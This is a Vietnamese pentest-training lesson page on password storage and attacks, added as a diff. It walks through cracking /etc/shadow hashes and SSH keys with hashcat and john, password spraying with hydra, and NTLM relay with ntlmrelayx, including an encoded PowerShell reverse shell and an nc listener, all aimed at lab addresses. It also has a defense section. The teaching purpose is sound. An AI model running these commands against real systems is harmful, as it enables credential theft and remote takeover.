@@ -1,0 +1,305 @@
+---
+title: "Mật khẩu và xác thực"
+code: "2.6"
+level: 2
+summary: "Mật khẩu yếu là chìa khoá mà kẻ tấn công thích nhất. Bài này cho bạn thấy mật khẩu được lưu thế nào, vì sao có hash trong tay là gần như có mật khẩu, và hai cách đoán (ngoại tuyến kín đáo, trực tuyến ồn ào) khác nhau ra sao."
+duration: "70 phút"
+updated: "2026-11-12"
+prereq: ["1.4", "2.2"]
+objectives:
+  - "Phân biệt được mã hoá và băm, và giải thích được salt ngăn kẻ tấn công điều gì"
+  - "Đọc được một dòng trong /etc/shadow để biết thuật toán băm và chọn đúng chế độ khi bẻ khoá"
+  - "Bẻ được một hash yếu bằng hashcat hoặc john với wordlist, ngay trên máy của mình"
+  - "Phân biệt được tấn công ngoại tuyến (kín đáo) và trực tuyến (ồn ào), và chọn cách phù hợp với tình huống"
+---
+import ConceptMap from '../../components/sim/ConceptMap.tsx';
+import Callout from '../../components/ui/Callout.astro';
+import Terminal from '../../components/ui/Terminal.astro';
+import Lenh from '../../components/ui/Lenh.astro';
+import LabBrief from '../../components/ui/LabBrief.astro';
+import HashDemo from '../../components/sim/HashDemo.tsx';
+import Quiz from '../../components/sim/Quiz.tsx';
+
+## Hình dung trước
+
+Một thủ thư giỏi không giữ bản sao chìa khoá nhà của từng độc giả. Họ giữ một dấu hiệu để nhận ra đúng người, mà từ dấu hiệu đó không làm lại được chìa. Băm mật khẩu là ý tưởng này: website giữ "dấu vân tay" của mật khẩu, không giữ mật khẩu gốc, nên dù kho dữ liệu bị lộ thì kẻ lấy được vẫn chưa có chìa trong tay.
+
+Vậy tại sao mật khẩu vẫn là thứ kẻ tấn công thích nhất? Vì "không có đường ngược" không có nghĩa là không đoán được. Kẻ tấn công đem hàng triệu mật khẩu phổ biến ra băm thử, rồi so dấu vân tay nào khớp. Mật khẩu càng giống thứ người ta hay đặt thì càng nhanh lộ.
+
+Ở các bài sau (3.1, 3.5), mật khẩu hoặc hash của một tài khoản thường chính là chiếc chìa để đi tiếp từ máy này sang máy khác, và trong phòng thi, một mật khẩu yếu bị tìm ra đôi khi đủ để lấy cả máy. Bài này cho bạn thấy cơ chế, rồi tự tay làm cả hai cách đoán.
+
+## Kiến thức chính
+
+### Băm khác mã hoá
+
+- **Mã hoá** hai chiều: có khoá thì giải ngược lại được (dùng cho HTTPS).
+- **Băm (hash)** một chiều: từ mật khẩu ra chuỗi băm thì dễ, ngược lại không có đường tắt (dùng lưu mật khẩu).
+
+Khi đăng nhập, website băm mật khẩu bạn nhập rồi so với chuỗi đã lưu. Khớp thì đúng, mà website không cần biết mật khẩu gốc.
+
+### Salt
+
+Nếu hai người cùng mật khẩu và băm trơn, hai chuỗi băm sẽ giống hệt nhau, và kẻ tấn công có thể dùng các bảng chuỗi băm tính sẵn (của hàng triệu mật khẩu thông dụng) để tra ngược rất nhanh.
+
+Salt là một chuỗi ngẫu nhiên, khác nhau cho mỗi người, được trộn vào mật khẩu trước khi băm, nên cùng mật khẩu cũng ra chuỗi băm khác nhau và bảng tính sẵn mất tác dụng. Thử bật/tắt salt:
+
+<HashDemo client:visible />
+
+### Đọc một dòng /etc/shadow
+
+`/etc/shadow` là file Linux cất dấu vân tay mật khẩu của mọi tài khoản, và chỉ root đọc được. Khi chiếm được quyền đọc nó (bài 3.1), bạn thấy các dòng như dưới đây. Điều đáng đọc nhất không phải hash mà là mấy ký tự ở đầu, vì chúng quyết định bạn bẻ khoá bằng cách nào:
+
+<Terminal title="Giải phẫu một dòng shadow">
+
+```text
+jdoe:$6$xyzSALT$hoRtE9k...rẤtDài:19000:0:99999:7:::
+       |  |      |
+       |  |      +-- phần hash
+       |  +-- salt
+       +-- $6$ = thuật toán (SHA-512). $1$=MD5, $5$=SHA-256, $y$=yescrypt
+```
+
+</Terminal>
+
+Phần `$6$` ở đầu chuỗi cho biết thuật toán băm nào được dùng (ở đây là SHA-512), giúp bạn chọn đúng chế độ khi bẻ khoá.
+
+## Thực hành: bẻ khoá và thử mật khẩu
+
+Có hai tình huống, và chọn đúng cách làm bắt đầu từ việc bạn đang có gì trong tay. Nếu đã lấy được hash (từ shadow, từ một file sao lưu...), bạn bẻ ngoại tuyến. Nếu chưa có gì, bạn phải thử trực tiếp vào dịch vụ.
+
+Hai cách khác nhau rất xa về độ ồn, và biết khi nào dùng cách nào là phần lớn tay nghề. Cả hai chạy trong lab của bạn (bài 0.2), nhắm vào máy mục tiêu của chính bạn.
+
+<ConceptMap
+  client:visible
+  title="Đang có gì trong tay thì đi đường nào"
+  width={660}
+  height={300}
+  nodes={[
+    { id: 'none', label: 'Chỉ có tên tài khoản', x: 110, y: 70, w: 180, detail: 'Chưa có hash nào. Chỉ còn cách thử mật khẩu thẳng vào dịch vụ (SSH, web, SMB). Chậm, ồn và dễ khoá tài khoản.' },
+    { id: 'hash', label: 'Có một hash', x: 110, y: 150, w: 180, tone: 'warn', detail: 'Lấy từ /etc/shadow, SAM, cơ sở dữ liệu hay một vé Kerberos. Bẻ trên máy mình, không chạm vào máy đích nên không ai thấy.' },
+    { id: 'net', label: 'Ngồi trong mạng Windows', x: 110, y: 230, w: 180, detail: 'Chưa có gì nhưng nghe được mạng nội bộ. Responder dụ máy khác gửi mã Net-NTLMv2 tới mình.' },
+    { id: 'on', label: 'Thử trực tuyến', sub: 'hydra, password spraying', x: 370, y: 70, w: 190, detail: 'Một mật khẩu khả dĩ cho nhiều tài khoản thì ít bị khoá hơn nhiều mật khẩu cho một tài khoản.' },
+    { id: 'off', label: 'Bẻ ngoại tuyến', sub: 'hashcat, john', x: 370, y: 150, w: 190, tone: 'warn', detail: 'Tốc độ tuỳ loại hash: NTLM rất nhanh, bcrypt rất chậm. Wordlist cộng rule thường đủ cho mật khẩu do người đặt.' },
+    { id: 'relay', label: 'Bắt rồi bẻ, hoặc relay', sub: 'Responder, ntlmrelayx', x: 370, y: 230, w: 190, detail: 'Bẻ được thì có mật khẩu. Bẻ không ra thì chuyển tiếp lần xác thực đó sang máy không bắt buộc SMB signing.' },
+    { id: 'login', label: 'Đăng nhập được', x: 580, y: 150, w: 140, tone: 'accent', detail: 'Có mật khẩu (hoặc hash dùng thẳng). Việc tiếp theo luôn là thử nó ở mọi dịch vụ và mọi máy khác.' },
+  ]}
+  edges={[
+    { from: 'none', to: 'on' },
+    { from: 'hash', to: 'off' },
+    { from: 'net', to: 'relay' },
+    { from: 'on', to: 'login' },
+    { from: 'off', to: 'login' },
+    { from: 'relay', to: 'login' },
+  ]}
+/>
+
+### Ngoại tuyến: có hash rồi, đoán ngược mật khẩu
+
+Khi đã có hash, việc bẻ khoá (thử rất nhiều mật khẩu cho tới khi ra đúng chuỗi băm) diễn ra trên **máy của bạn**, không gửi gì tới mục tiêu nên không bị khoá tài khoản và không để lại log bên họ.
+
+Đó là lý do đây là cách kín đáo nhất. Dùng **hashcat** hoặc **john**, với một danh sách mật khẩu (wordlist) như `rockyou.txt` có sẵn trong Kali, vốn gồm hàng triệu mật khẩu thật đã bị lộ trong các vụ rò rỉ trước:
+
+<Lenh noi="Terminal trên máy Kali (máy của bạn, không chạm mục tiêu)" muc="Đoán ngược mật khẩu gốc từ một hash đã lấy được, bằng cách thử cả một danh sách mật khẩu phổ biến">
+
+<Terminal title="hashcat bẻ hash SHA-512 bằng wordlist">
+
+```text
+kali@lab:~$ hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
+$6$xyzSALT$hoRtE9k...:Summer2024!
+
+kali@lab:~$ # hoặc dùng john
+kali@lab:~$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Summer2024!      (jdoe)
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `hashcat`: chương trình bẻ hash bằng GPU, rất nhanh.
+- `-m 1800`: mã chọn **chế độ hash**, ở đây là SHA-512 crypt (đúng loại `$6$` đọc được ở trên). Mỗi loại hash có mã riêng; không chắc loại nào thì dùng `hashid`.
+- `hash.txt`: file chứa hash cần bẻ. `/usr/share/wordlists/rockyou.txt`: danh sách mật khẩu phổ biến có sẵn trong Kali, dùng để thử lần lượt.
+- `john --wordlist=... hash.txt`: cách dùng tương tự với công cụ `john` (John the Ripper), chỉ khác cú pháp cờ.
+
+</div>
+
+<div slot="doc">
+
+- Dòng kết quả của hashcat có dạng `hash:mật-khẩu`. Phần sau dấu `:` cuối cùng (`Summer2024!`) **chính là mật khẩu gốc** vừa bẻ được.
+- Dòng của john in `mật-khẩu    (tên-tài-khoản)`, dễ đọc hơn.
+- Không ra kết quả: mật khẩu không nằm trong wordlist này, thử wordlist khác hoặc thêm quy tắc biến đổi (rule), nằm ngoài phạm vi bài này.
+
+</div>
+
+</Lenh>
+
+<Callout type="note" label="Không chỉ hash shadow: khoá SSH, KeePass, và luật biến đổi">
+Nhiều "bí mật" khác cũng bẻ được ngoại tuyến, chỉ cần **đổi file thành một dòng hash** rồi đưa cho john/hashcat. Bộ john có sẵn hàng loạt công cụ `*2john`:<br />
+- Khoá SSH riêng có đặt mật khẩu (`id_rsa` lấy được từ máy nạn nhân): <code>ssh2john id_rsa &gt; key.hash</code> rồi bẻ như thường — ra passphrase là dùng được khoá để SSH.<br />
+- Kho KeePass (`.kdbx`, bài 3.2): <code>keepass2john Vault.kdbx &gt; kp.hash</code>.<br />
+Khi wordlist trơn không ra, thêm **luật biến đổi** để tự chế biến từ gốc (thêm số, đổi hoa thường, ghép năm): <code>hashcat -m 1800 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code>. `best64` là bộ luật nhỏ mà hiệu quả, hay thử đầu tiên.
+</Callout>
+
+### Trực tuyến: thử mật khẩu thẳng vào dịch vụ
+
+Khi chưa có hash, bạn phải hỏi trực tiếp dịch vụ "mật khẩu này đúng không?" bằng **hydra**. Cách này ồn: mỗi lần thử là một lần đăng nhập thất bại ghi vào log, và thử nhiều lần cho một tài khoản sẽ làm tài khoản bị khoá, báo động cho đội phòng thủ.
+
+Vì vậy người làm nghề đảo ngược cách thử: thay vì thử nhiều mật khẩu cho **một** tài khoản, họ thử **một** mật khẩu khả dĩ cho **nhiều** tài khoản ("spray").
+
+Mỗi tài khoản chỉ thất bại một lần nên không bị khoá, và chỉ cần một người trong cả công ty dùng mật khẩu như `Mua-He-2024!` là đủ. Danh sách tên người dùng ở đây chính là thứ bạn gom được ở bài 2.1 và 2.2:
+
+<Lenh noi="Terminal trên máy Kali, nhắm vào máy trong lab" muc="Thử một mật khẩu khả dĩ cho nhiều tài khoản cùng lúc (password spraying) qua SSH">
+
+<Terminal title="hydra thử mật khẩu qua SSH">
+
+```text
+kali@lab:~$ hydra -L users.txt -p 'Summer2024!' ssh://10.10.14.30
+[22][ssh] host: 10.10.14.30   login: svc_backup   password: Summer2024!
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `hydra`: công cụ thử mật khẩu trực tuyến, hỗ trợ nhiều dịch vụ (SSH, FTP, web...).
+- `-L users.txt`: chữ `L` hoa nghĩa là đọc một **danh sách tên người dùng** từ file (chính là tên gom được ở bài 2.1, 2.2).
+- `-p 'Summer2024!'`: chữ `p` thường nghĩa là chỉ thử **một** mật khẩu. (Chữ `P` hoa dùng khi muốn đọc một danh sách mật khẩu.)
+- `ssh://10.10.14.30`: giao thức và địa chỉ đích.
+
+</div>
+
+<div slot="doc">
+
+- Dòng kết quả xuất hiện **chỉ khi đăng nhập thành công**: `[22][ssh]` là cổng và dịch vụ, rồi `login` (tài khoản) và `password` (mật khẩu) đã khớp.
+- Không có dòng nào: không tài khoản nào trong danh sách khớp mật khẩu này.
+- Hydra thử lần lượt; dừng sớm bằng `Ctrl+C` nếu đã thấy kết quả cần.
+
+</div>
+
+</Lenh>
+
+<Callout type="warn">
+Thử mật khẩu hàng loạt vào dịch vụ thật chỉ được làm trong lab hoặc khi có phép. Nó gây khoá tài khoản và ồn ào trên hệ thống giám sát.
+</Callout>
+
+### Bắt mã xác thực ngay trên mạng (Net-NTLMv2)
+
+Không phải lúc nào cũng cần có hash sẵn. Trên mạng Windows, khi một máy cần tìm một cái tên mà DNS không biết (ví dụ gõ nhầm tên máy chủ file), nó có thể "hô to" cho cả mạng nội bộ nghe: "ai là máy này?", qua các giao thức cũ tên LLMNR và NBT-NS. Một máy trong mạng có thể trả lời "tôi đây" và dụ máy kia gửi tới một **mã phản hồi xác thực** (Net-NTLMv2) được tạo từ mật khẩu người dùng. Mã đó đem đi bẻ khoá ngoại tuyến như một hash.
+
+Công cụ kinh điển cho phía tấn công là **Responder**; hiểu nó để biết vì sao các giao thức quảng bá cũ là một rủi ro. Đây thuần tuý là vấn đề cấu hình mặc định, nên cách chặn rất rõ ràng (xem Góc phòng thủ): tắt LLMNR và NBT-NS thì cả lớp tấn công này biến mất.
+
+Một biến thể nguy hiểm hơn là **chuyển tiếp** (relay): thay vì bẻ khoá, kẻ tấn công chuyển thẳng mã xác thực bắt được tới một máy khác để đăng nhập dưới danh nghĩa nạn nhân. Lớp chặn chính là bật **SMB signing**, khiến mã bắt được không dùng lại được ở máy khác.
+
+Relay đáng nhớ vì nó giải đúng một tình huống hay gặp: bạn bắt được Net-NTLMv2 của một tài khoản nhưng **mật khẩu quá mạnh, bẻ không ra**. Nếu tài khoản đó là quản trị viên cục bộ trên một máy khác, và máy đó không bắt buộc SMB signing, bạn không cần mật khẩu nữa.
+
+<Lenh noi="Ba terminal trên máy Kali, trong mạng lab Windows" muc="Tìm máy không bắt buộc SMB signing, rồi chuyển tiếp một lần xác thực bắt được tới máy đó để chạy lệnh" quyen="Tài khoản bị bắt phải là quản trị viên cục bộ trên máy đích; không relay ngược về chính máy đã gửi">
+
+<Terminal title="Relay Net-NTLMv2 bằng ntlmrelayx">
+
+```text
+kali@lab:~$ nxc smb 10.10.14.0/24 --gen-relay-list relay.txt
+SMB  10.10.14.60  445  FILES01  (signing:False)
+SMB  10.10.14.50  445  DC01     (signing:True)
+
+kali@lab:~$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.14.60 \
+            -c "powershell -enc JABjAGwAaQBlAG4AdAA..."
+[*] Servers started, waiting for connections
+
+    (làm cho nạn nhân kết nối tới Kali: ví dụ từ một shell đã có trên máy khác)
+C:\> dir \\10.10.14.7\share
+
+[*] SMBD: Received connection from 10.10.14.40
+[*] Authenticating against smb://10.10.14.60 as MEGACORP/ADM_FILES SUCCEED
+[*] Executed specified command on host: 10.10.14.60
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `nxc smb ... --gen-relay-list relay.txt`: quét dải mạng và ghi ra những máy **không bắt buộc** SMB signing (`signing:False`), tức là relay tới được.
+- `impacket-ntlmrelayx -t 10.10.14.60 -c "..."`: dựng một máy chủ SMB giả; ai xác thực vào nó, nó chuyển lần xác thực ấy sang máy `-t` rồi chạy lệnh trong `-c`. `-smb2support` bật SMB2; `--no-http-server` tắt phần HTTP không dùng.
+- `powershell -enc ...`: một reverse shell PowerShell đã mã hoá base64 (bài 2.7). Mở sẵn `nc -lvnp 443` ở terminal thứ ba.
+- `dir \\10.10.14.7\share`: cách ép một máy xác thực tới Kali khi bạn đã chạy được lệnh dưới tên tài khoản cần bắt. Cách khác là chờ Responder đầu độc như ở trên; khi đó phải tắt máy chủ SMB và HTTP của Responder (`SMB = Off`, `HTTP = Off` trong `Responder.conf`) để nhường cổng cho ntlmrelayx.
+
+</div>
+
+<div slot="doc">
+
+- `SUCCEED` cùng `Executed specified command` nghĩa là lệnh đã chạy trên máy đích với quyền của tài khoản bị relay.
+- Bỏ `-c` thì ntlmrelayx tự rút hash trong SAM của máy đích, cũng rất có ích.
+- `signing:True` trên DC là mặc định, nên không relay SMB tới DC được. Máy trạm và máy chủ thành viên thường để `False`.
+- Báo `STATUS_ACCESS_DENIED`: tài khoản bắt được không phải quản trị viên cục bộ trên máy đích. Thử máy khác trong `relay.txt`.
+
+</div>
+
+</Lenh>
+
+### Điều gì làm mật khẩu mạnh
+
+Quan trọng nhất là **độ dài** và **tính khó đoán**, không phải nhồi ký tự đặc biệt. Mật khẩu nằm trong rockyou (như "Summer2024!") bị thử đầu tiên nên yếu bất kể trông phức tạp. Một câu dài nhiều từ ngẫu nhiên vừa mạnh vừa dễ nhớ hơn.
+
+<LabBrief
+  ten="Tự bẻ một hash lấy từ chính máy lab của bạn"
+  muctieu="Lấy một hash thật từ /etc/shadow trên máy bạn đang kiểm soát, rồi bẻ nó ngoại tuyến bằng wordlist"
+  may="Metasploitable 2, đã có quyền root (bài 3.1)"
+  ip="10.10.14.20"
+  thoigian="25 phút"
+  xong="Bạn đọc được mật khẩu chữ rõ của một tài khoản, và nói được tại sao nó bẻ được (có trong rockyou) hay vì sao một hash khác trên cùng máy không bẻ được"
+>
+
+1. Đọc dòng của một tài khoản trong `/etc/shadow`, xác định thuật toán băm từ phần đầu chuỗi.
+2. Lưu đúng định dạng hash vào một file trên Kali.
+3. Chọn chế độ hashcat đúng với thuật toán đó và chạy với rockyou.
+4. Thử lại với một mật khẩu bạn tự đặt, dài và khó đoán hơn, xem có bẻ được không trong cùng thời gian.
+
+<div slot="goiy1">
+Phần "Đọc một dòng /etc/shadow" ở đầu bài đã giải thích từng trường trong dòng đó, kể cả cách đọc ký hiệu thuật toán.
+</div>
+
+<div slot="goiy2">
+Mục "Ngoại tuyến: có hash rồi, đoán ngược mật khẩu" có đúng lệnh hashcat và mã chế độ cho từng loại hash hay gặp.
+</div>
+
+<div slot="kiemtra">
+
+- Đúng: hashcat in dòng `hash:mật-khẩu`, với mật khẩu đọc được là chữ thường trong tiếng Anh.
+- Hashcat báo "Hash-mode was not found" hoặc không bẻ ra gì: kiểm tra lại mã chế độ (`-m`) có khớp với ký hiệu thuật toán đã đọc ở bước 1 không.
+- Mật khẩu tự đặt ở bước 4 không bẻ được trong vài phút: đó chính là bằng chứng sống cho phần "Điều gì làm mật khẩu mạnh" — ghi lại làm minh chứng.
+
+</div>
+
+</LabBrief>
+
+## Góc phòng thủ
+
+<Callout type="defense">
+Hãy chia làm hai vai. <strong>Nếu bạn xây hệ thống:</strong> đừng lưu mật khẩu gốc; dùng hàm băm chuyên cho mật khẩu và cố ý chạy chậm (bcrypt, yescrypt, argon2) kèm salt riêng mỗi người, để bẻ khoá ngoại tuyến đắt hơn nhiều lần; giới hạn số lần đăng nhập sai và khoá tạm để cản hydra. Bật xác thực nhiều lớp, và ưu tiên loại <strong>chống lừa đảo</strong> (khoá FIDO2, passkey) hơn mã OTP gõ tay, vì OTP vẫn bị dụ nhập vào trang giả (bài 6.1). <strong>Nếu bạn là người dùng:</strong> mật khẩu dài, mỗi nơi một mật khẩu khác, dùng trình quản lý mật khẩu, vì cái nguy hiểm nhất không phải mật khẩu yếu mà là một mật khẩu dùng lại ở nhiều nơi.
+<br /><strong>Riêng mạng Windows:</strong> tắt LLMNR và NBT-NS để chặn bắt Net-NTLMv2; bật SMB signing để chặn chuyển tiếp. <strong>Phát hiện:</strong> đăng nhập thất bại hàng loạt trên nhiều tài khoản từ một nguồn (password spraying) là sự kiện 4625/4771; một máy bỗng trả lời các truy vấn phân giải tên quảng bá là dấu hiệu có Responder.
+</Callout>
+
+## Lỗi người mới hay gặp
+
+- **Nhầm băm với mã hoá.** Người mới nghe "mật khẩu được mã hoá" và nghĩ có thể giải mã. Thật ra hệ thống đúng lưu băm; còn hệ thống lưu dạng mã hoá (giải ngược được) là thiết kế sai, và đó là một phát hiện đáng ghi trong báo cáo.
+- **Chọn sai chế độ hashcat (`-m`) cho loại hash.** Gõ nhầm chế độ thì hashcat chạy mãi không ra, và bạn tưởng mật khẩu mạnh nên bỏ cuộc. Hãy luôn đọc ký tự đầu (`$6$`) rồi mới chọn chế độ.
+- **Tin ký tự đặc biệt quan trọng hơn độ dài.** `P@ssw0rd!` trông phức tạp nhưng nằm trong mọi wordlist nên bị thử đầu tiên. Một câu dài nhiều từ ngẫu nhiên mới thật sự khó đoán. Lúc viết khuyến nghị cho khách hàng, đừng bảo họ "thêm ký tự đặc biệt" mà hãy bảo họ tăng độ dài.
+
+## Kiểm tra nhanh
+
+<Quiz
+  client:visible
+  questions={[
+    { q: 'Vì sao bẻ khoá ngoại tuyến "an toàn" hơn cho kẻ tấn công so với thử trực tuyến?', options: ['Nhanh hơn', 'Diễn ra trên máy họ, không chạm mục tiêu nên không bị khoá tài khoản hay ghi log', 'Không cần wordlist'], answer: 1, explain: 'Có hash rồi thì việc đoán ngược làm cục bộ, mục tiêu không hề biết.' },
+    { q: '`$6$` ở đầu một dòng shadow cho biết điều gì?', options: ['Độ dài mật khẩu', 'Thuật toán băm là SHA-512', 'Số lần đăng nhập'], answer: 1, explain: '$6$ = SHA-512 crypt; ký hiệu này giúp chọn đúng chế độ bẻ khoá.' },
+    { q: 'Salt chống lại kiểu tấn công nào là chính?', options: ['Từ chối dịch vụ', 'Bảng hash tính sẵn cho mật khẩu phổ biến', 'Nghe lén mạng'], answer: 1, explain: 'Salt riêng mỗi người làm các bảng tính sẵn mất tác dụng.' },
+    { q: 'Kỹ thuật "password spraying" là gì?', options: ['Thử mọi mật khẩu cho một tài khoản', 'Thử một mật khẩu khả dĩ cho nhiều tài khoản', 'Xoá mật khẩu'], answer: 1, explain: 'Spray thử một mật khẩu cho nhiều tài khoản để tránh khoá từng tài khoản.' },
+    { q: 'Cách chặn gốc việc bắt mã Net-NTLMv2 bằng Responder trong mạng Windows là gì?', options: ['Đổi mật khẩu thường xuyên hơn', 'Tắt các giao thức phân giải tên quảng bá cũ (LLMNR, NBT-NS) và bật SMB signing', 'Cài thêm phần mềm diệt virus'], answer: 1, explain: 'Đây là vấn đề cấu hình mặc định: tắt LLMNR/NBT-NS làm mất cả lớp tấn công, SMB signing chặn chuyển tiếp.' },
+  ]}
+/>
+
+## Ghi nhớ
+
+- Băm là một chiều, nhưng "không đảo ngược được" không có nghĩa là "không đoán được". Mật khẩu càng giống thứ người ta hay đặt thì hash càng nhanh lộ.
+- Có hash trong tay thì đọc ký tự đầu (`$6$...`) để biết thuật toán, rồi bẻ ngoại tuyến bằng hashcat hoặc john với rockyou. Cách này kín đáo vì không chạm vào mục tiêu.
+- Chưa có hash thì thử trực tiếp bằng hydra, nhưng phải spray (một mật khẩu cho nhiều tài khoản) để tránh bị khoá và để ít ồn hơn.
+- Độ dài và tính khó đoán quyết định độ mạnh, không phải số ký tự đặc biệt.
